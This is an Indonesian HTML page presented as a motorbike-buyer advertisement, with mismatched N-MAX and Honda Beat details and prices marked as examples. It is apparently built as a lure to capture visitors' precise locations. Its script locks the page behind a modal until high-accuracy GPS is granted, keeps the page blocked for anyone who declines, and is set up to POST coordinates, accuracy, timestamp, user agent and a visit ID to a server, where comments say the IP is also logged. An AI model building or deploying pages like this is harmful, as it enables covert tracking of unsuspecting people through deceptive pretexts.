<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Kami Beli N-MAX Anda, Harga Bagus Segala Kondisi.</title>

<!-- ===== Open Graph (WhatsApp preview) ===== -->
<meta property="og:title" content="Honda Beat 2018 ‚Ä¢ Siap Dibeli">
<meta property="og:description" content="Butuh Honda Beat area saya saja. Contoh: Rp 11,5 jt ‚Ä¢ KM 20-30rb ‚Ä¢ Pajak hidup.">
<meta property="og:image" content="https://images.unsplash.com/photo-1517336714731-489689fd1ca8?q=80&w=1200&auto=format&fit=crop">
<meta property="og:url" content="https://example.com/">
<meta property="og:type" content="website">

<!-- Bootstrap & jQuery (opsional untuk komponen lain di halaman) -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

<style>
  body{background:#fff}
  .hero{position:relative;aspect-ratio:16/9;background:#111;overflow:hidden}
  .hero img{width:100%;height:100%;object-fit:cover}
  .pager{position:absolute;bottom:.6rem;right:.75rem;background:rgba(0,0,0,.6);color:#fff;padding:.25rem .6rem;border-radius:999px;font-size:.8rem}
  .dots{position:absolute;left:50%;bottom:.6rem;transform:translateX(-50%);display:flex;gap:.35rem}
  .dot{width:.42rem;height:.42rem;border-radius:999px;background:rgba(255,255,255,.5)}
  .dot.active{background:#fff}
  .badge-pill{border:1px solid #e5e7eb;border-radius:999px;background:#fff;color:#0f172a}
  .credit{background:#eef2ff;border:1px solid #c7d2fe;border-radius:14px}
  .bottom-bar{position:fixed;left:0;right:0;bottom:0;background:#fff;border-top:1px solid #e5e7eb;z-index:20}
  .btn-ghost{background:#fff;border:1px solid #e5e7eb}
  .brand-chip{display:inline-flex;align-items:center;gap:.5rem;background:#0b1220;color:#fff;padding:.5rem .6rem;border-radius:10px;font-weight:700;font-size:.75rem}

  /* ===== Modal Lokasi (overlay) ===== */
  #loc-modal {
    position: fixed; inset:0;
    background: rgba(0,0,0,0.65);
    display: flex; align-items: center; justify-content: center;
    z-index: 9999;
    visibility: hidden; opacity:0;
    transition: opacity .25s ease, visibility .25s ease;
    pointer-events: none;
  }
  #loc-modal.active { visibility: visible; opacity:1; pointer-events: auto; }
  #loc-modal .card {
    background: #111827; border-radius: 16px; max-width: 480px; width: 92%;
    padding: 22px; color: #e5e7eb; box-shadow:0 10px 30px rgba(0,0,0,.5)
  }
  #loc-modal h1 { margin:0 0 8px; font-size:20px }
  #loc-modal p { margin:6px 0; color:#9ca3af }
  .actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px}
  button{padding:10px 14px;border:0;border-radius:10px;cursor:pointer;font-weight:600}
  .primary{background:#16a34a;color:#fff}
  .secondary{background:#374151;color:#e5e7eb}
  .danger{background:#dc2626;color:#fff}
  .ok{background:#052e18;border:1px solid #0a6b33;padding:8px;border-radius:8px;color:#c7ffdf}
  .hidden{display:none}
  .field{margin:6px 0}
  input[readonly]{width:100%;padding:8px;border-radius:8px;border:1px solid #374151;background:#0b1020;color:#e5e7eb}

  /* Spinner tombol hanya saat tombol "sibuk" */
  #btn-allow{ position:relative }
  #btn-allow[data-busy="true"]{ pointer-events:none; opacity:.9; }
  #btn-allow[data-busy="true"]::after{
    content:""; position:absolute; right:12px; top:50%; transform:translateY(-50%);
    width:1rem; height:1rem; border:.18rem solid rgba(255,255,255,.35);
    border-top-color:#fff; border-radius:50%; animation:spin .8s linear infinite;
  }
  @keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}

  /* Kunci body saat modal aktif */
  body.lock { overflow:hidden; touch-action:none; }
</style>
</head>
<body>

<div class="container px-0" style="max-width:480px">
  <!-- HERO -->
  <div class="hero">
    <img src="/img/n-max.jpg" alt="Yamaha N-Max">
    <div class="pager"><span id="pageNow">1</span> / 5</div>
    <div class="dots" id="dots"></div>
  </div>

  <!-- Brand / chip -->
  <div class="px-3 pt-2"><span class="brand-chip">Mencari Unit ‚Ä¢ Buyer Only</span></div>

  <!-- Header -->
  <div class="d-flex justify-content-between align-items-start px-3 pt-2">
    <div>
      <h1 class="h5 mb-1 fw-bold">Yamaha N-Max Segala Kondisi</h1>
      <div class="text-muted small">STNK Only, BPKB Only, Full Paper, Bukan Curian</div>
    </div>
    <div class="d-flex gap-2">
      <button class="btn btn-sm btn-ghost rounded-circle" aria-label="Share">‚§¥</button>
      <button class="btn btn-sm btn-ghost rounded-circle" aria-label="Save">‚ô°</button>
    </div>
  </div>

  <!-- Badges -->
  <div class="px-3 pt-2 d-flex flex-wrap gap-2">
    <span class="badge badge-pill px-3 py-2">‚õΩ Bensin</span>
    <span class="badge badge-pill px-3 py-2">üèçÔ∏è 155 cc</span>
    <span class="badge badge-pill px-3 py-2">üìç Radius area saya</span>
    <span class="badge badge-pill px-3 py-2">‚öôÔ∏è Matic (CVT)</span>
  </div>

  <!-- Budget + Estimasi -->
  <div class="px-3 pt-3">
    <div class="fs-5 fw-bold">Budget contoh: Rp 11.500.000</div>
    <div class="credit mt-2 shadow-sm">
      <div class="border-bottom p-3 fw-semibold">Preferensi Pembayaran</div>
      <div class="row g-0 p-3 align-items-center">
        <div class="col"><div class="text-secondary small">Cash di tempat</div></div>
        <div class="col-auto fw-bold text-primary">Prioritas</div>
        <div class="col-12 my-2"></div>
        <div class="col"><div class="text-secondary small">Atau Kredit</div></div>
        <div class="col-auto fw-bold text-primary">DP ‚â• Rp 2,5 jt <small class="text-primary-emphasis fw-semibold">tenor fleksibel</small></div>
      </div>
    </div>
  </div>

  <!-- Kriteria Unit -->
  <div class="px-3 pt-3 pb-5">
    <h4 class="h6 fw-semibold">Kriteria Unit</h4>
    <div class="d-flex align-items-start py-2 border-bottom">
      <div class="bg-success text-white d-inline-grid me-2 rounded-circle" style="width:20px;height:20px;place-items:center;font-size:.75rem">‚úì</div>
      <p class="mb-0 small">Body & rangka utuh, mesin sehat, kelistrikan normal.</p>
    </div>
    <div class="d-flex align-items-start py-2 border-bottom">
      <div class="bg-success text-white d-inline-grid me-2 rounded-circle" style="width:20px;height:20px;place-items:center;font-size:.75rem">‚úì</div>
      <p class="mb-0 small">BPKB & STNK lengkap, pajak hidup (boleh mepet).</p>
    </div>
    <div class="d-flex align-items-start py-2 border-bottom">
      <div class="bg-success text-white d-inline-grid me-2 rounded-circle" style="width:20px;height:20px;place-items:center;font-size:.75rem">‚úì</div>
      <p class="mb-0 small">Domisili penjual dalam radius area saya (lokasi wajib aktif).</p>
    </div>
  </div>
</div>

<!-- Bottom Action Bar -->
<div class="bottom-bar">
  <div class="container" style="max-width:480px">
    <div class="d-flex gap-2 py-2">
      <a class="btn btn-ghost flex-fill fw-bold" href="#"><span class="me-1">üí¨</span>Chat</a>
      <a class="btn btn-ghost flex-fill fw-bold" href="tel:+62000000000"><span class="me-1">üìû</span>Call</a>
      <a class="btn btn-success flex-fill fw-bold" style="flex:2" href="#offer">Tawarkan Unit</a>
    </div>
  </div>
</div>

<!-- ===== Modal Lokasi (Gated) ===== -->
<div id="loc-modal" role="dialog" aria-modal="true" aria-labelledby="loc-title">
  <!-- STEP 1: Consent -->
  <main class="card" id="step-consent">
    <h1 id="loc-title">Verifikasi Lokasi Diperlukan</h1>
    <p>Kami melaksanakan jual beli kendaraan, dan lokasi memengaruhi harga penawaran. Untuk melihat harga dasar, silakan aktifkan lokasi.</p>
    <div class="actions">
      <button class="primary" id="btn-allow">Izinkan & Lanjutkan</button>
      <button class="secondary" id="btn-decline">Saya Tidak Setuju</button>
    </div>
    <p class="small mt-2">Catatan: Geolocation hanya berjalan di situs <strong>HTTPS</strong>. Jika tombol tidak berfungsi, cek koneksi aman.</p>
  </main>

  <!-- STEP 2: Success (auto-close) -->
  <main class="card hidden" id="step-ok">
    <h1>Lokasi Diterima</h1>
    <p class="ok">Terima kasih. Lokasi berhasil diverifikasi.</p>
    <div class="field"><input id="lat" readonly placeholder="Latitude"></div>
    <div class="field"><input id="lng" readonly placeholder="Longitude"></div>
    <div class="field"><input id="acc" readonly placeholder="Akurasi (meter)"></div>
    <div class="field"><input id="ts"  readonly placeholder="Waktu (ISO)"></div>
    <p id="post-status" class="mt-2"></p>
    <p class="small text-muted mt-2" id="auto-close-note">Menutup dalam 1 detik‚Ä¶</p>
  </main>

  <!-- STEP 3: Denied -->
  <main class="card hidden" id="step-denied">
    <h1>Akses Lokasi Ditolak</h1>
    <p>Halaman tidak dapat dibuka tanpa lokasi. Aktifkan izin lokasi di pengaturan browser, lalu kembali ke halaman ini.</p>
    <div class="actions">
      <button class="secondary" id="btn-help">Cara Mengaktifkan Lokasi</button>
      <button class="danger" id="btn-retry">Coba Lagi</button>
    </div>
  </main>
</div>

<script>
  /* ====== KONFIG ====== */
  const POST_ENDPOINT = "";           // contoh: "https://example.com/loc-hook" ‚Äî kosongkan jika tidak perlu kirim ke server
  const REQUIRED_ACCURACY_M = 200;    // akurasi maksimal agar valid
  const AUTO_CLOSE_MS = 800;          // jeda tutup modal setelah sukses
  const USE_WATCH = true;             // true = watchPosition agar dapat fix terbaik

  /* ====== UTIL ====== */
  const $ = sel => document.querySelector(sel);
  const show = el => {
    ["#step-consent","#step-ok","#step-denied"].forEach(s => $(s).classList.add("hidden"));
    el.classList.remove("hidden");
  };
  const lockBody = on => document.body.classList.toggle("lock", !!on);

  const modal = $("#loc-modal");
  const els = {
    consent: $("#step-consent"),
    ok: $("#step-ok"),
    denied: $("#step-denied"),
    lat: $("#lat"), lng: $("#lng"), acc: $("#acc"), ts: $("#ts"),
    btnAllow: $("#btn-allow"), btnDecline: $("#btn-decline"),
    btnHelp: $("#btn-help"), btnRetry: $("#btn-retry"),
    postStatus: $("#post-status")
  };

  // spinner via attribute data-busy (CSS pseudo-element)
  function setBusy(b){ 
    if(b){ els.btnAllow.setAttribute("data-busy","true"); els.btnAllow.style.pointerEvents="none"; }
    else { els.btnAllow.removeAttribute("data-busy"); els.btnAllow.style.pointerEvents=""; }
  }

  // Selalu tampilkan modal di setiap kunjungan (selalu minta lokasi)
  function openGate(){ modal.classList.add("active"); lockBody(true); }
  function closeGate(){ modal.classList.remove("active"); lockBody(false); }

  function ensureSecureOrigin(){
    const isSecure = location.protocol === "https:" || location.hostname === "localhost";
    if(!isSecure) alert("Fitur lokasi memerlukan HTTPS. Akses halaman ini via https://");
  }

  // visit_id untuk korelasi server-side (IP diambil server)
  const visitId = (crypto.randomUUID ? crypto.randomUUID() : String(Date.now()) + Math.random().toString(36).slice(2));

  let asking = false, watchId = null, bestFix = null, autoCloseTimer = null;

  function startRequest(){
    if(asking) return;
    if(!("geolocation" in navigator)){ alert("Browser Anda tidak mendukung Geolocation."); show(els.denied); return; }

    asking = true; setBusy(true);

    if(USE_WATCH){
      let timer = setTimeout(()=>{ // fallback stop setelah 15 detik
        if(watchId !== null) navigator.geolocation.clearWatch(watchId);
        finalizeFix(bestFix, true);
      }, 15000);

      watchId = navigator.geolocation.watchPosition(
        pos => {
          bestFix = pickBetter(bestFix, pos);
          if(bestFix && bestFix.coords.accuracy <= REQUIRED_ACCURACY_M){
            clearTimeout(timer);
            navigator.geolocation.clearWatch(watchId);
            watchId = null;
            finalizeFix(bestFix, false);
          }
        },
        err => { clearTimeout(timer); onErr(err); },
        { enableHighAccuracy:true, maximumAge:0, timeout:15000 }
      );
    } else {
      navigator.geolocation.getCurrentPosition(onPos, onErr, { enableHighAccuracy:true, maximumAge:0, timeout:15000 });
    }
  }

  function pickBetter(a, b){ 
    if(!a) return b; 
    return (b.coords.accuracy < a.coords.accuracy) ? b : (b.timestamp > a.timestamp ? b : a);
  }

  function onPos(pos){ finalizeFix(pos, false); }

  function finalizeFix(pos, wasFallback){
    asking = false; setBusy(false);
    if(!pos){ show(els.denied); return; }

    const { latitude, longitude, accuracy } = pos.coords;
    const iso = new Date(pos.timestamp).toISOString();

    els.lat.value = latitude.toFixed(7);
    els.lng.value = longitude.toFixed(7);
    els.acc.value = Math.round(accuracy);
    els.ts.value  = iso;

    if(accuracy > REQUIRED_ACCURACY_M){
      alert(`Akurasi lokasi ¬±${Math.round(accuracy)} m (di atas ambang ${REQUIRED_ACCURACY_M} m).\nSilakan pindah ke area terbuka atau aktifkan High Accuracy, lalu coba lagi.`);
      show(els.denied);
      return;
    }

    show(els.ok);

    if(POST_ENDPOINT){
      fetch(POST_ENDPOINT, {
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body: JSON.stringify({
          visit_id: visitId,
          latitude, longitude, accuracy, timestamp: iso,
          userAgent: navigator.userAgent,
          page: location.href
          // IP diambil server dari req.ip / cf-connecting-ip
        })
      }).then(r=>{
        els.postStatus.textContent = r.ok ? "Lokasi tersimpan." : "Gagal kirim ke server.";
      }).catch(()=>{
        els.postStatus.textContent = "Gagal kirim ke server.";
      });
    }

    clearTimeout(autoCloseTimer);
    autoCloseTimer = setTimeout(()=> { closeGate(); }, AUTO_CLOSE_MS);
  }

  function onErr(err){
    asking = false; setBusy(false);
    if(watchId !== null){ navigator.geolocation.clearWatch(watchId); watchId = null; }
    if(err.code === 1){ // PERMISSION_DENIED
      show(els.denied);
    } else if(err.code === 3){ // TIMEOUT
      alert("Pengambilan lokasi timeout. Coba lagi di area terbuka atau aktifkan GPS (High Accuracy).");
      show(els.consent);
    } else { // POSITION_UNAVAILABLE
      alert("Lokasi tidak tersedia. Pastikan layanan lokasi aktif.");
      show(els.consent);
    }
  }

  /* ====== EVENTS ====== */
  els.btnAllow.addEventListener("click", () => { startRequest(); });
  els.btnDecline.addEventListener("click", () => { show(els.denied); });
  els.btnRetry?.addEventListener("click", () => { show(els.consent); });
  els.btnHelp?.addEventListener("click", () => {
    alert("Aktifkan lokasi di pengaturan browser:\n\n- Chrome: Ikon gembok ‚Üí Site settings ‚Üí Location ‚Üí Allow\n- Safari iOS: Settings ‚Üí Privacy & Security ‚Üí Location Services ‚Üí Safari ‚Üí While Using\n- Android: Settings ‚Üí Location ON (High accuracy), lalu beri izin untuk browser.");
  });

  /* ====== STARTUP ====== */
  (function init(){
    openGate();          // tampilkan modal & kunci halaman
    ensureSecureOrigin();// info HTTPS
    // Tidak pakai Permissions API agar SELALU minta lokasi via gesture setiap visit
  })();
</script>
</body>
</html>
